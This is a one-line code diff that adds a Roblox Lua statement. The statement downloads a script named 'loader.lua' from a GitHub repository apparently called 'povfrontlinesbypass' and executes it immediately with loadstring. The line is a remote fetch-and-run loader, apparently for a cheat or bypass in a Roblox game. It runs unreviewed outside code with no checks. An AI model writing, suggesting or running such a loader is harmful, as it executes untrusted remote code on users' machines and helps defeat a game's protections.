@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/expectedbadthings/povfrontlinesbypass/refs/heads/main/loader.lua"))()
